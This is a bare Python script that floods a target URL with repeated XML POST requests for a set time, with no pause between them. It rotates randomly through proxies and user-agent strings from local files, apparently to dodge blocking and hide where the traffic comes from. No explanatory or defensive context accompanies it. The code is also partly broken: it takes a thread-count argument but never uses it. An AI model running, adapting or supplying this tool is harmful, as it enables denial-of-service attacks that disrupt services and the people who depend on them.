import requests
import time
import argparse
import random

def read_file(file_name):
    with open(file_name, 'r') as f:
        return f.read()

def get_proxies(file_name):
    proxies = read_file(file_name)
    proxies = proxies.split('\n')
    proxies = list(filter(lambda x: x != '', proxies))
    return proxies

def get_useragents(file_name):
    useragents = read_file(file_name)
    useragents = useragents.split('\n')
    useragents = list(filter(lambda x: x != '', useragents))
    return useragents

def send_request(url, data, proxy, useragent):
    session = requests.Session()
    session.proxies = {'http': proxy, 'https': proxy}
    headers = {'Content-Type': 'application/xml', 'User-Agent': useragent}
    response = session.post(url, data=data, headers=headers)
    return response.content

def main(url, run_time, num_threads):
    proxies = get_proxies('proxy.txt')
    useragents = get_useragents('ua.txt')
    data = read_file('data.xml')
    threads_finished = 0
    start_time = time.time()
    while time.time() - start_time < run_time:
        proxy = random.choice(proxies)
        useragent = random.choice(useragents)
        try:
            response = send_request(url, data, proxy, useragent)
            print(response)
        except Exception as e:
            print(str(e))
        # time.sleep(0.001)
    threads_finished += 1

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', required=True)
    parser.add_argument('--run_time', required=True)
    parser.add_argument('--num_threads', required=True)

    args = parser.parse_args()
    main(args.url, int(args.run_time), int(args.num_threads))
